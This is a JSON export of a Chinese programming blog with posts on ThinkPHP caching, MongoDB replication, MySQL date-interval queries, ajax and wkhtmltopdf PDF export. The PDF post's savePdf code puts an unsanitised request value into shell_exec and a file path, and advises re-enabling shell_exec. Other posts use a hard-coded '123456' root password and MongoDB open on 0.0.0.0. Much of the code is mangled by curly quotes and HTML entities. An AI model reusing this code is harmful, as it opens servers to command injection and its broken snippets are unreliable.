[{"title":"","date":"2017-02-21T08:02:56.000Z","path":"2017/02/21/Lumen-user-register-and-login-auth/","text":"title: Lumen实现用户注册登录认证date: 2017-02-21 06:47:10categories: “PHP”tags: Lumen Api PHP","tags":[]},{"title":"thinkphp数据缓存","date":"2017-02-04T14:34:07.000Z","path":"2017/02/04/thinkphp-e6-95-b0-e6-8d-ae-e7-bc-93-e5-ad-98/","text":"由于第一次打开页面会很慢，所以需要做个数据缓存。正好thinkphp框架有封装好的方法，这里说下如何操作的； 1.首先介绍数据缓存的用法 // 缓存初始化S(array(‘type’=&gt;’xcache’,’expire’=&gt;60));缓存初始化可以支持的参数根据不同的缓存方式有所区别，常用的参数是： 参数 描述 expire 缓存有效期（时间为秒） prefix 缓存标识前缀 type 缓存类型系统目前已经支持的缓存类型包括：Apachenote、Apc、Db、Eaccelerator、File、Memcache、Redis、Shmop、Sqlite、Wincache和Xcache。 如果S方法不传入type参数初始化的话，则读取配置文件中设置的DATA_CACHE_TYPE参数值作为默认类型。同样的道理，prefix参数如果没有传入会读取配置文件的DATA_CACHE_PREFIX参数值，expire参数没有传入则读取DATA_CACHE_TIME配置值作为默认。 2.缓存设置 // 设置缓存S(‘name’,$value);// 缓存数据300秒S(‘name’,$value,300);// 采用文件方式缓存数据300秒S(‘name’,$value,array(‘type’=&gt;’file’,’expire’=&gt;300));3.缓存读取 // 读取缓存$value = S(‘name’);4.缓存删除 // 删除缓存S(‘name’,null);5.对象方式缓存 // 初始化缓存$cache = S(array(‘type’=&gt;’xcache’,’prefix’=&gt;’think’,’expire’=&gt;600));$cache-&gt;name = ‘value’; // 设置缓存$value = $cache-&gt;name; // 获取缓存unset($cache-&gt;name); // 删除缓存6.缓存队列 //设置了length参数后，系统只会缓存最近的100条缓存数据。S(array(‘type’=&gt;’xcache’,’length’=&gt;100,’expire’=&gt;60));7.具体操作，我的代码如下 public function test() { $cacheConfig = array( ‘type’ =&gt; ‘file’, ‘expire’ =&gt; 60, ‘prefix’ =&gt; ‘order_dbcache‘ ); if(!$num = S(‘test’,’’,$cacheConfig)){ sleep(10); $num = 11; S(‘test’,$num, $cacheConfig); } echo $num; }&lt;/pre&gt; 8.访问该方法,生成缓存文件 第一次访问时间 第二次访问时间 说明已经使用上缓存了。","tags":[{"name":"S方法","slug":"S方法","permalink":"http://yoursite.com/tags/S方法/"},{"name":"thinkphp","slug":"thinkphp","permalink":"http://yoursite.com/tags/thinkphp/"},{"name":"数据缓存","slug":"数据缓存","permalink":"http://yoursite.com/tags/数据缓存/"}]},{"title":"mongo-3.2主从配置","date":"2017-01-04T16:08:24.000Z","path":"2017/01/04/mongo-3-2-replication/","text":"mongodb的复制使用的oplog,类似于mysql复制的binlog,不同的是oplog是保存在local数据库中的.需要合理的设置oplog的大小,如果此大小没有设置那么mongodb将会使用可用空间的5%来存放oplog.官方建议64位系统至少分配1G大小.当slave端落后太多master端的时候,复制会终止,此时需要管理员手工来重启mongodb然后使用resync来重新同步.此外你可以设置autoresync参数,当复制终止10秒后mongodb会自动重启复制,slave端会每隔10分钟自动重新同步一次.注意官方现在强烈不建议使用master-slave复制模式,建议使用replica sets复制. 参数介绍这里介绍的mongodb的主从复制,并不是复制集replica sets,复制的参数如下: Replication options: --oplogSize arg 操作日志大小,单位M Master/slave options (old; use replica sets instead): --master 指定角色为master mode --slave 指定角色为slave mode --source arg 当角色为slave的时候使用,格式为:&lt;server:port&gt; --only arg 当角色为slave的时候使用,指定单独同步的数据库,默认为同步所有数据库. --slavedelay arg 指定一个应用日志的延时,单位秒 --autoresync 创建mongo仓库vim /etc/yum.repos.d/mongodb-org-3.2.repo [mongodb-org-3.2] name=MongoDB Repository baseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.2/x86_64/ gpgcheck=1 enabled=1 gpgkey=https://www.mongodb.org/static/pgp/server-3.2.asc 主从服务器配置#安装 yum install -y mongodb-org #修改配置 egrep -v '^$|^#' /etc/mongod.conf systemLog: destination: file logAppend: true path: /var/log/mongodb/mongod.log storage: dbPath: /var/lib/mongo journal: enabled: true processManagement: fork: true # fork and run in background pidFilePath: /var/run/mongodb/mongod.pid # location of pidfile net: port: 27017 bindIp: 0.0.0.0 # Listen to local interface only, comment to listen on all interfaces. security: authorization: enabled 配置keyFile文件（官网介绍）密钥文件的内容作为共享密码的成员复制集。密钥文件的内容必须相同副本集的所有成员。你可以使用任何方法生成一个密钥文件选择。密钥文件的内容必须是6 - 1024个字符长。 openssl rand -base64 512 &gt;&gt; /var/lib/mongo/mongo.key chmod 600 /var/lib/mongo/mongo.key 启动服务#主服务器启动 mongod --master -f /etc/mongod.conf --keyFile /var/lib/mongo/mongo.key #从服务器启动 mongod --slave --source master_ip:27017 -f /etc/mongod.conf --keyFile /var/lib/mongo/mongo.key 测试主服务器创建账号 #!/bin/bash mongo_connect=\"mongo 127.0.0.1/admin\" cmd_use_admin=\"db = db.getSiblingDB('admin');\" cmd_create_user=\"db.createUser({\\\"user\\\":\\\"sa\\\", \\\"pwd\\\":\\\"123456\\\", \\\"roles\\\":[\\\"root\\\"]});\" echo $cmd_use_admin &gt; dbcmd.js echo $cmd_create_user &gt;&gt; dbcmd.js execute=\"$mongo_connect dbcmd.js\" echo \"#!/bin/sh\" &gt; createDBUser.sh echo $execute &gt;&gt; createDBUser.sh sh createDBUser.sh &amp;&amp; rm -f createDBUser.sh 主库插入一条数据 use test db.xxoo.save({xx:00}); 从库查看是否同步 use test db.test.find() 主库宕机如何将从库切为主库方式一 停止从库kill -2 PID 删除从数据目录中的 local.`rm -rf /data/mongodb/data/db/local.` 以 –master 模式启动从库 (注意修改原有端口)mongod --master -f /etc/mongod.master.conf 方式二 备份从库 重建主库，导入新数据参考：https://docs.mongodb.com/v3.2/replication/ https://blog.imdst.com/mongodb-yi-di-zhu-cong-tong-bu-pei-zhi/ http://blog.csdn.net/su377486/article/details/51599255","tags":[{"name":"mongo-replcation","slug":"mongo-replcation","permalink":"http://yoursite.com/tags/mongo-replcation/"},{"name":"mongo主从","slug":"mongo主从","permalink":"http://yoursite.com/tags/mongo主从/"}]},{"title":"mysql查询24小时内无重复的记录","date":"2016-12-29T11:21:55.000Z","path":"2016/12/29/mysql-query-repeat-recodes-in-hours/","text":"需求： 一次性解决问题率=一次解决的对话量/接入量一次解决的对话量：客户在接入人工客服对话结束后24小时（暂定）内未再次请求人工服务的对话由于条件还要加上日期间隔，所以从mysql查询结果到PHP处理。 例如：每隔2天内，用户请求对话结束时间到下次发起时间的间隔超过24小时，即为一次性解决对话量。然后再除以接入量，就是一次性解决问题率。 首先给出sql语句，间隔查询参考mysql日期间隔查询 – 间隔两天的记录select floor( (2 - to_days(FROM_UNIXTIME(1470022740)) % 2 + to_days(FROM_UNIXTIME(createTime)) )/2 ) as sortId , createUserId, createTime, endTimeFROM think_kf_chat_im_group WHERE endTime &lt;&gt; 0 AND createTime BETWEEN 1470022740 AND 1470886740 and kfUserId &lt;&gt; 0order BY sortId,createUserId;结果如下 下面把这些记录到php通过数组来处理 /** * 一次性问题解决率,用户对话结束后,24小时内不在有新的对话出现 * @param $array array * return array */ private function oneTimesQuesRate($array){ $len = count($array); $arr = []; $sortId = []; $sortArr = []; $id = []; $count = []; $total = []; //遍历获取同一个sortId foreach($array as $v){ $sortId[] = $v[&apos;sortid&apos;]; } //取唯一sortId $unique_sortId = array_unique($sortId); //循环取出值 foreach($unique_sortId as $v){ $id[] = $v; } //循环取出间隔自定义时间内和24小时内不在发起的对话记录 for($i = 0; $i &amp;lt; $len; $i++){ for($j = $i+1; $j &amp;lt; $len; $j++){ foreach($id as $v){ if($v == $array[$i][&apos;sortid&apos;]){ if($array[$i][&apos;createuserid&apos;] == $array[$j][&apos;createuserid&apos;]){ if($array[$i][&apos;endtime&apos;] + 86400 &amp;lt;= $array[$j][&apos;createtime&apos;]){ // $num++; $sortArr[] = $v; } } } } //每次对比后跳出循环 break; } //获取每条的用户ID $arr[$array[$i][&apos;sortid&apos;]][] = $array[$i][&apos;createuserid&apos;]; } //循环每个sortId,去重获取总数 foreach($arr as $k=&amp;gt;$v){ $count[$k] = count(array_unique($v)); } //取相同值得总数 $num = array_count_values($sortArr); //合并两个数组的值 foreach($count as $k=&amp;gt;$v){ foreach($num as $k1=&amp;gt;$v1){ if($k == $k1){ $total[$k] = $v + $v1; }else{ $total[$k] = $v; } } } return $total; }&lt;/pre&gt; 返回的结果如下图： &nbsp; &nbsp; &nbsp; &nbsp; 然后用这个结果来除以接入量，也就是下面的sql语句，当然这个sql查询到的结果也需要通过php来处理。也可以把上面的结果插入到数据库的临时表，通过sql来相除。多种方式可以实现。 – 获取每隔2天的接入量SELECT floor( (2 - to_days(FROM_UNIXTIME(1470022740)) % 2 + to_days(FROM_UNIXTIME(createTime)) )/2 ) as sortId, min(date_format(from_unixtime(createTime),’%y-%m-%d’)) as mtime, count(kfUserId) as cFROM think_kf_chat_im_group WHERE endTime &lt;&gt; 0 AND createTime BETWEEN 1470022740 AND 1470886740 and kfUserId &lt;&gt; 0GROUP BY sortId;结果如下： 用php来处理刚查询出的数据 /** * @param $arr1 array 总接入量 * @param $arr array 处理过的接入量 * @return array 返回百分比 */ private function processData($arr1,$arr){ $result = []; foreach($arr1 as $k1=&amp;gt;$v1){ foreach($arr as $k=&amp;gt;$v){ if($v1[&apos;sortid&apos;] == $k){ $result[$k1][&apos;mtime&apos;] = $v1[&apos;mtime&apos;]; $result[$k1][&apos;c&apos;] = floor($v/$v1[&apos;c&apos;]*100); } } } return $result; }&lt;/pre&gt; 通过highcharts绘画出图形 &nbsp;","tags":[{"name":"24小时内重复记录","slug":"24小时内重复记录","permalink":"http://yoursite.com/tags/24小时内重复记录/"},{"name":"mysql查询重复记录","slug":"mysql查询重复记录","permalink":"http://yoursite.com/tags/mysql查询重复记录/"}]},{"title":"ajax作用域范围无法获取返回值","date":"2016-12-16T16:15:46.000Z","path":"2016/12/16/ajax-unable-to-get-return-value/","text":"需求：判断title的值是否在mongo库里存在，如果不存在就继续，存在则返回false。 代码如下： //检测标题是否存在 var result = true; $.ajax({ type: ‘POST’, url: ‘APP/Home/Custorm/chkTitle’, data: {‘title’:$(‘#title’).val()}, success: function(data){ if(data.count &gt;= 1){ alert(‘标题已存在,请重新输入!’); $(‘#title’).select(); result = false; } }, error: function(e){ console.log(e); } }); return result;上述代码是有问题的，返回的result一直true； 后查到原因，是因为ajax默认是异步传输，也就是说，ajax并没有等待 success:function(data) 回调函数执行完，就已经向下执行了。于是 result的值永远只会等于其初始化的值，也就是true. 解决办法， 设置为同步传输。 //默认 async: true //同步 async: false 参考：http://blog.csdn.net/zxstone/article/details/7297284","tags":[{"name":"ajax作用域","slug":"ajax作用域","permalink":"http://yoursite.com/tags/ajax作用域/"},{"name":"ajax同步","slug":"ajax同步","permalink":"http://yoursite.com/tags/ajax同步/"},{"name":"ajax异步","slug":"ajax异步","permalink":"http://yoursite.com/tags/ajax异步/"},{"name":"ajax返回值","slug":"ajax返回值","permalink":"http://yoursite.com/tags/ajax返回值/"}]},{"title":"thinkphp页面显示权限控制","date":"2016-12-08T19:10:05.000Z","path":"2016/12/08/thinkphp-page-access-control/","text":"需求：报表生成后，需要发布报表浏览页，在发布的同时，需要设置权限；创建者有浏览该报表权限，所属部门有浏览权限，员工级别有浏览权限，只要包含其中就可； 如图所示： 用户信息在session里保存，所以当创建报表是，获取用户信息，当发布报表时，写入用户信息和用户设置的权限到mongo库里 下面是显示的操作方法 //获取用户名,只显示当前用户的报表$info = $_SESSION[‘info’][‘data’];$map[‘user’] = $info[‘user_name’];$map = $this-&gt;getAuthInfo($map);$where[‘_complex’] = array(‘_logic’=&gt;”or”, array(‘user’=&gt;$map[‘user’]), array(‘dept’=&gt;$map[‘dept’]),array(‘level’=&gt;$map[‘level’]));$data = $model-&gt;order(‘ym desc’)-&gt;where($where)-&gt;limit($Page-&gt;firstRow.’,’.$Page-&gt;listRows)-&gt;select(); private function getAuthInfo($map) //获取当前用户的部门和级别 $info = $_SESSION[‘title’]; //判断用户所属部门 if($info[‘department’] == ‘技术服务部’) $map[‘dept’] = ‘jw’; elseif ($info[‘department’] == ‘手游服务部’) $map[‘dept’] = ‘sy’; elseif ($info[‘department’] == ‘端游服务部’) $map[‘dept’] = ‘dy’; elseif ($info[‘department’] == ‘监控服务部’) $map[‘dept’] = ‘jk’; else $map[‘dept’] = ‘all’; //判断用户的级别 if($info[&apos;powerTitle&apos;] == &apos;员工&apos;) $map[&apos;level&apos;] = &apos;staff&apos;; elseif ($info[&apos;powerTitle&apos;] == &apos;组长&apos;) $map[&apos;level&apos;] = &apos;leader&apos;; elseif ($info[&apos;powerTitle&apos;] == &apos;主管&apos;) $map[&apos;level&apos;] = &apos;competent&apos;; elseif ($info[&apos;powerTitle&apos;] == &apos;经理&apos;) $map[&apos;level&apos;] = &apos;manager&apos;; elseif ($info[&apos;powerTitle&apos;] == &apos;总监&apos;) $map[&apos;level&apos;] = &apos;director&apos;; return $map; }&lt;/pre&gt; 显示效果如下：","tags":[{"name":"mongo or查询","slug":"mongo-or查询","permalink":"http://yoursite.com/tags/mongo-or查询/"},{"name":"_complex","slug":"complex","permalink":"http://yoursite.com/tags/complex/"},{"name":"_logic=&gt;\"or\"","slug":"logic-gt-or","permalink":"http://yoursite.com/tags/logic-gt-or/"},{"name":"报表浏览权限","slug":"报表浏览权限","permalink":"http://yoursite.com/tags/报表浏览权限/"},{"name":"权限控制","slug":"权限控制","permalink":"http://yoursite.com/tags/权限控制/"}]},{"title":"mysql查询日期间隔自定义日期","date":"2016-12-06T17:32:35.000Z","path":"2016/12/06/mysql-select-date-interval-custom-date/","text":"需求：由于查询日期范围内数据，需要定义日期范围内数据的单位，比如从2016年11月1日到2016年12月10日，间隔为5天，也就是11月1日，11月6日，11月11日。。。 这里要用到mysql函数，如下： DELIMITER $$create function getTimeSortId(timetype varchar(20),startTime datetime,usetime datetime,splitNum int(10))returns int(10)begindeclare sortId int;set sortId = 0;if timetype = “day” then set sortId = floor( (splitNum - to_days(startTime) % splitNum + to_days(usetime) )/splitNum );end if;if timetype = “week” then set sortId = floor((splitNum - floor((TO_DAYS(startTime) + 5 )/7) % splitNum + floor((TO_DAYS(usetime) + 5 )/7) )/splitNum);end if;if timetype = “month” then set sortId = floor((splitNum - ( month(startTime) + year(startTime) 12) % splitNum + ( month(usetime) + year(usetime) 12) )/splitNum);end if;return sortId;end $$DELIMITER ;解释下函数内容： getTimeSortId为函数，timetype : 日期类型，startTime ： 开始时间，usetime : 字段时间，splitNum : 间隔数； 如果传递的参数为天，间隔数 - 转化为天的开始时间 % 间隔数 + 转化为天的字段时间 / 间隔数 = 排序ID 下面周跟月就具体介绍了； 具体运行如下： select getTimeSortId(‘day’,from_unixtime(1470109260,’%y-%m-%d’),from_unixtime(createTime,’%y-%m-%d’),3) as sortId, min(from_unixtime(createTime,’%y-%m-%d’)) as mtime, count(*) from think_kf_chat_im_groupwhere createTime BETWEEN 1470109260 AND 1472442060group by sortId; 到数据库中运行，查看生成的语法 CREATE DEFINER=root@localhost FUNCTION getTimeSortId(timetype varchar(20),startTime datetime,usetime datetime,splitNum int(10)) RETURNS int(10)begindeclare sortId int;declare totalDay int;declare totalMonth int;declare totalYear int;set sortId = 0;if timetype = “day” then set sortId = floor( (splitNum - to_days(startTime) % splitNum + to_days(usetime) )/splitNum );end if;if timetype = “week” then set sortId = floor((splitNum - floor((TO_DAYS(startTime) + 5 )/7) % splitNum + floor((TO_DAYS(usetime) + 5 )/7) )/splitNum);end if;if timetype = “month” then set sortId = floor((splitNum - ( month(startTime) + year(startTime) 12) % splitNum + ( month(usetime) + year(usetime) 12) )/splitNum);end if;return sortId;end;如果不是root用户的话，会有权限问题； 我这里数据库有的不是root用户，所以要把这个函数放到php里定义成一个方法，然后调用生成sql语句来执行； /** * @param type day week month * @param startTime 开始时间,必须是时间戳 * @param key 时间字段 * @param asName 生成的ID * @param isTimestamp key是否为时间戳 * @param echo $this-&amp;gt;getSortId(&quot;week&quot;, 1477929600, &quot;intitime&quot;, 2, &quot;sortId&quot;, false); */ protected function getSortId($type, $startTime, $key, $splitNum, $asName = &quot;sortId&quot;, $isTimestamp = false) { if ($isTimestamp) { $key = &quot;FROM_UNIXTIME(&quot; . $key . &quot;)&quot;; } $startTime = &quot;FROM_UNIXTIME(&quot; . $startTime . &quot;)&quot;; if ($type == &quot;day&quot;) { $sql = &quot;floor( (&quot; . $splitNum . &quot; - to_days(&quot; . $startTime . &quot;) % &quot; . $splitNum . &quot; + to_days(&quot; . $key . &quot;) )/&quot; . $splitNum . &quot; ) as &quot; . $asName . &quot; &quot;; } else if ($type == &quot;week&quot;) { $sql = &quot;floor((&quot; . $splitNum . &quot; - floor((TO_DAYS(&quot; . $startTime . &quot;) + 5 )/7) % &quot; . $splitNum . &quot; + floor((TO_DAYS(&quot; . $key . &quot;) + 5 )/7) )/&quot; . $splitNum . &quot;) as &quot; . $asName . &quot; &quot;; } else if ($type == &quot;month&quot;) { $sql = &quot;floor((&quot; . $splitNum . &quot; - ( month(&quot; . $startTime . &quot;) + year(&apos;&quot; . $startTime . &quot;&apos;) * 12) % &quot; . $splitNum . &quot; + ( month(&quot; . $key . &quot;) + year(&apos;&quot; . $key . &quot;&apos;) * 12) )/&quot; . $splitNum . &quot;) as &quot; . $asName . &quot; &quot;; } else { $sql = &quot;(0) as &quot; . $asName . &quot; &quot;; } return $sql; }&lt;/pre&gt; 调用次方法来生成field /** * 根据日期间隔统计数据 * @param $dateFormat int 间隔数字 * @param $dateUtil string 间隔单位,如:天,周,月,年 * @param $sTime int | datetime 开始时间 * @param $dateField string 日期字段名 * @param $opertion string 统计数量 * @param $groupType string 日期类型 * echo $this-&amp;gt;setIntervalTime(3,&apos;day&apos;,1477929600,&apos;createTime&apos;,&apos;count(*)&apos;,&apos;day&apos;); */ private function setIntervalTime($dateFormat,$dateUtil,$sTime,$dateField,$opertion,$groupType,$isTimestamp = true) { if(is_numeric($dateFormat) &amp;amp;&amp;amp; is_string($dateUtil)){ if(!is_int($sTime)){ $sTime = strtotime($sTime); } $field = $this-&amp;gt;getSortId($dateUtil,$sTime,$dateField,$dateFormat,&quot;sortId&quot;,$isTimestamp) . &quot;,min(date_format(&quot; . ($isTimestamp ? &quot;from_unixtime(&quot; . $dateField . &quot;)&quot; : $dateField). &quot;,&apos;&quot;.$this-&amp;gt;getGroupFormat($groupType).&quot;&apos;)) as mtime,&quot;. $opertion.&quot; as c&quot;; }else{ $this-&amp;gt;error(&apos;你输入的日期单位或日期格式不正确&apos;); exit; } return $field; }&lt;/pre&gt; 具体调用如下： $field = $this-&gt;setIntervalTime($dateFormat,$dateUnit,$sTime,’createTime’,’count(*)’,$groupType);$where[‘createTime’] = array(‘between’,array($sTime,$eTime));$model-&gt;field($field)-&gt;where($where)-&gt;group(‘sortId’)-&gt;select();获取的数据到通过highcharts到前端显示如下 &nbsp; 感谢同事鹏哥的帮助；大家有好的方法，求留言讨论；","tags":[{"name":"mysql日期间隔查询","slug":"mysql日期间隔查询","permalink":"http://yoursite.com/tags/mysql日期间隔查询/"},{"name":"todays","slug":"todays","permalink":"http://yoursite.com/tags/todays/"},{"name":"天数排序","slug":"天数排序","permalink":"http://yoursite.com/tags/天数排序/"},{"name":"自定义时间间隔","slug":"自定义时间间隔","permalink":"http://yoursite.com/tags/自定义时间间隔/"}]},{"title":"html-to-pdf-for-php","date":"2016-12-01T18:54:34.000Z","path":"2016/12/01/html-to-pdf-for-php/","text":"需求：报表页面点击下载后转成pdf文件； 之前找了很多插件，用下来wkhtmltopdf最好用； 下面说下如何操作 首先下载插件，最好翻墙下载，不然很慢，最好下载tar.gz包，不要到github上clone,文件太大； http://wkhtmltopdf.org/downloads.html 拷贝文件到命令目录 tar xf wkhtmltox-0.12.4_linux-generic-amd64.tar.xzcd wkhtmltox/bincp wkhtmltopdf /usr/local/bin/html页面 &lt;button class=”btn-success btn button” style=”margin-left: 85%” onclick=”print_pdf()”&gt;下载PDF&lt;/button&gt;&lt;form action=”&lt;?php echo U(‘Custorm/savePdf’) ?&gt;” method=”post” name=”hld_res” id=”hideform”&gt; &lt;input type=”hidden” id=”hide_content” name=”content” /&gt; &lt;input type=”hidden” name=”title” value=”&lt;?php echo $data[0][‘title’]?&gt;”/&gt;&lt;/form&gt;JS方法 function print_pdf(){ //下载范围 bdhtml=window.document.body.innerHTML; sprnstr=”&lt;!–startprint–&gt;”; eprnstr=”&lt;!–endprint–&gt;”; prnhtml=bdhtml.substring(bdhtml.indexOf(sprnstr)+17); prnhtml=prnhtml.substring(0,prnhtml.indexOf(eprnstr));// 将获取的html代码添加到隐藏域中传给php文件处理 $(“#hide_content”).val(“”+prnhtml+””); $(“#hideform”).submit(); }PHP方法 public function savePdf() { $html = $_REQUEST[‘content’]; ob_start(); $html=’ &lt;html&gt; &lt;link href=”http://your_domain_name/Public/css/style.css“ rel=”stylesheet”&gt; &lt;link href=”http://your_domain_name/Public/css/style-responsive.css“ rel=”stylesheet”&gt; &lt;link type=”text/css” rel=”stylesheet” href=”http://your_domain_name/Public/js/bootstrap-table/bootstrap-table.css&quot;&amp;gt; &lt;meta http-equiv=”Content-Type” content=”text/html; charset=utf-8” /&gt; &lt;body style=”background: white;”&gt; ‘.$html; $html .= ‘ &lt;/body&gt;&lt;/html&gt;’; $filename = $_REQUEST[‘title’] ? $_REQUEST[‘title’] : ‘报表-‘.date(‘Y-m-d’); file_put_contents(“{$filename}.html”, $html); ob_end_clean(); //转换HTML TO PDF shell_exec(“/usr/local/bin/wkhtmltopdf -q -s A2 -O Landscape {$filename}.html {$filename}.pdf”); if(file_exists(“{$filename}.pdf”)){ header(‘Content-type:application/octet-stream’); header(“Content-Disposition:attachment;filename={$filename}.pdf”); header(‘Content-Length:’.filesize(“{$filename}.pdf”)); readfile(“{$filename}.pdf”); //删除本地的文件 unlink(“{$filename}.pdf”); unlink(“{$filename}.html”); }else{ exit; } }pdf文档效果 效果还是不错的； 这里遇到一个问题，就是线上的shell_exec()函数不执行。改目录权限，改sudo配置等等，都没效果，然后去配置文件里查看php.ini, 里面添加了disable_functions，去掉你要用的函数就可以了。 参考：http://blog.csdn.net/qq_14873105/article/details/51394026","tags":[{"name":"highcharts to pdf","slug":"highcharts-to-pdf","permalink":"http://yoursite.com/tags/highcharts-to-pdf/"},{"name":"html to pdf","slug":"html-to-pdf","permalink":"http://yoursite.com/tags/html-to-pdf/"},{"name":"shell_exec()","slug":"shell-exec","permalink":"http://yoursite.com/tags/shell-exec/"},{"name":"wkhtmltopdf","slug":"wkhtmltopdf","permalink":"http://yoursite.com/tags/wkhtmltopdf/"},{"name":"页面生成pdf","slug":"页面生成pdf","permalink":"http://yoursite.com/tags/页面生成pdf/"}]},{"title":"thinkphp修改mongo数据","date":"2016-11-29T16:34:56.000Z","path":"2016/11/29/thinkphp-update-mongo-data/","text":"由于需要修改mongo库的status的值，首先要找到这条记录的id； 我这里的id在mysql库里有记录，每条记录里有key_time字段，所以需要获取这个字段的值； 获取该字段的值需要从url里获取，通过ajax方式传递到后台来处理； function commit(){ var url = self.location.href; var title = $(‘h2’).html().split(‘_’); $.ajax({ type: ‘POST’, url: ‘&lt;?php echo U(“ReportBrowse/info”)?&gt;’, data : {url:url,title:title[0]}, success: function (data) {// console.log(data); }, error: function (e) { } }); }后台会处理url，截取key_time的值 public function info(){ //截取url字符串 $url = $_REQUEST[‘url’]; if ($url) { $action = explode(‘&amp;’,$url); $params = array(); foreach ($action as $param) { $item = explode(‘=’, $param); $params[$item[0]] = $item[1]; } //根据预览页面的url中的key参数,从数据库yulan数据库中获取mongoId,然后到mongo库的template表中查找,修改status状态 $this-&amp;gt;editMongoId($params[$item[0]]); }这里调用了另外一个方法，这个方法就是查找mongoid, 然后根据mongoid修改status的值 private function editMongoId($key_time){ //实例化mysql库的yulan表,根据传递的key_time查找mongoid $yulan_mysql = new Model(‘yulan’,’’,’DB_MYSQL_KW’); //实例化mongo库的template表,根据mongoid查找status状态 $temp_mongo = new MongoModel(‘template’,’’,’DB_MONGO’); if($key_time){ //获取预览数据里的mongoid $where[‘key_time’] = array(‘eq’,$key_time); $yulan_data = $yulan_mysql-&gt;field(‘mongoId’)-&gt;where($where)-&gt;select(); if($mid = $yulan_data[0][‘mongoid’]){ //根据mongoid获取模板mongo里的所有数据 $status = $temp_mongo-&gt;where(array( ‘_id’ =&gt; $mid, ))-&gt;select(); //如果状态为”草稿”,则修改mongo库的template的状态 if($status[$mid][‘status’] == ‘草稿’){ $data[‘status’] = ‘已发布’; $temp_mongo-&gt;where(array( ‘_id’ =&gt; $mid, ))-&gt;save($data); } } }}&nbsp;","tags":[{"name":"mongo","slug":"mongo","permalink":"http://yoursite.com/tags/mongo/"},{"name":"update_mongo","slug":"update-mongo","permalink":"http://yoursite.com/tags/update-mongo/"}]},{"title":"php多维数组整理","date":"2016-11-29T16:15:08.000Z","path":"2016/11/29/php-array-add-value/","text":"获取的数据需要到highcharts中显示，所以格式如下，但是在显示的时候，会有时间不存在，导致在一起显示的无法正常显示。所以需要整理数组是同样长度，并且在无时间的值为0； array (size=3) 0 =&gt; array (size=2) ‘day’ =&gt; array (size=16) 0 =&gt; string ‘16-09-02’ (length=8) 1 =&gt; string ‘16-09-03’ (length=8) 2 =&gt; string ‘16-09-04’ (length=8) 3 =&gt; string ‘16-09-05’ (length=8) 4 =&gt; string ‘16-09-06’ (length=8) 5 =&gt; string ‘16-09-07’ (length=8) 6 =&gt; string ‘16-09-08’ (length=8) 7 =&gt; string ‘16-09-09’ (length=8) 8 =&gt; string ‘16-09-10’ (length=8) 9 =&gt; string ‘16-09-11’ (length=8) 10 =&gt; string ‘16-09-12’ (length=8) 11 =&gt; string ‘16-09-13’ (length=8) 12 =&gt; string ‘16-09-14’ (length=8) 13 =&gt; string ‘16-09-15’ (length=8) 14 =&gt; string ‘16-09-16’ (length=8) 15 =&gt; string ‘16-09-17’ (length=8) ‘板块回复帖总数’ =&gt; array (size=16) 0 =&gt; int 98 1 =&gt; int 207 2 =&gt; int 188 3 =&gt; int 125 4 =&gt; int 196 5 =&gt; int 153 6 =&gt; int 228 7 =&gt; int 289 8 =&gt; int 254 9 =&gt; int 245 10 =&gt; int 220 11 =&gt; int 326 12 =&gt; int 286 13 =&gt; int 497 14 =&gt; int 419 15 =&gt; int 243 1 =&gt; array (size=2) ‘day’ =&gt; array (size=13) 0 =&gt; string ‘16-09-03’ (length=8) 1 =&gt; string ‘16-09-05’ (length=8) 2 =&gt; string ‘16-09-06’ (length=8) 3 =&gt; string ‘16-09-07’ (length=8) 4 =&gt; string ‘16-09-08’ (length=8) 5 =&gt; string ‘16-09-09’ (length=8) 6 =&gt; string ‘16-09-11’ (length=8) 7 =&gt; string ‘16-09-12’ (length=8) 8 =&gt; string ‘16-09-13’ (length=8) 9 =&gt; string ‘16-09-14’ (length=8) 10 =&gt; string ‘16-09-15’ (length=8) 11 =&gt; string ‘16-09-16’ (length=8) 12 =&gt; string ‘16-09-17’ (length=8) ‘版主回复帖数’ =&gt; array (size=13) 0 =&gt; int 1 1 =&gt; int 4 2 =&gt; int 2 3 =&gt; int 3 4 =&gt; int 3 5 =&gt; int 2 6 =&gt; int 1 7 =&gt; int 4 8 =&gt; int 8 9 =&gt; int 5 10 =&gt; int 2 11 =&gt; int 3 12 =&gt; int 1 2 =&gt; array (size=2) ‘day’ =&gt; array (size=16) 0 =&gt; string ‘16-09-02’ (length=8) 1 =&gt; string ‘16-09-03’ (length=8) 2 =&gt; string ‘16-09-04’ (length=8) 3 =&gt; string ‘16-09-05’ (length=8) 4 =&gt; string ‘16-09-06’ (length=8) 5 =&gt; string ‘16-09-07’ (length=8) 6 =&gt; string ‘16-09-08’ (length=8) 7 =&gt; string ‘16-09-09’ (length=8) 8 =&gt; string ‘16-09-10’ (length=8) 9 =&gt; string ‘16-09-11’ (length=8) 10 =&gt; string ‘16-09-12’ (length=8) 11 =&gt; string ‘16-09-13’ (length=8) 12 =&gt; string ‘16-09-14’ (length=8) 13 =&gt; string ‘16-09-15’ (length=8) 14 =&gt; string ‘16-09-16’ (length=8) 15 =&gt; string ‘16-09-17’ (length=8) ‘板块主题帖总数’ =&gt; array (size=16) 0 =&gt; int 10 1 =&gt; int 39 2 =&gt; int 56 3 =&gt; int 21 4 =&gt; int 31 5 =&gt; int 27 6 =&gt; int 42 7 =&gt; int 59 8 =&gt; int 46 9 =&gt; int 33 10 =&gt; int 45 11 =&gt; int 47 12 =&gt; int 64 13 =&gt; int 76 14 =&gt; int 67 15 =&gt; int 36这里写个私有方法，方便内部调用 private function getDateLength($arr) { //数组映射 $new_arr = []; foreach($arr as $k=&gt;$v){ foreach($v as $k1=&gt;$v1){ if($k1 != ‘day’){ foreach($v[‘day’] as $k2=&gt;$v2){ $new_arr[$k][$v2] = $v1[$k2]; } } } } //数组补值 $data = []; $max = max($new_arr); foreach($new_arr as $k=&gt;$v){ foreach($max as $k1=&gt;$v1){ if(in_array($k1,array_keys($v))){ $data[$k][$k1] = $v[$k1]; }else{ $data[$k][$k1] = 0; } } } //转化成原型 $array = []; foreach($arr as $k=&gt;$v){ foreach($v as $k1=&gt;$v1){ if($k1 != ‘day’){ $array[$k][$k1] = array_values($data[$k]); }else{ $array[$k][$k1] = array_keys($data[$k]); } } } return $array; }显示效果如下： 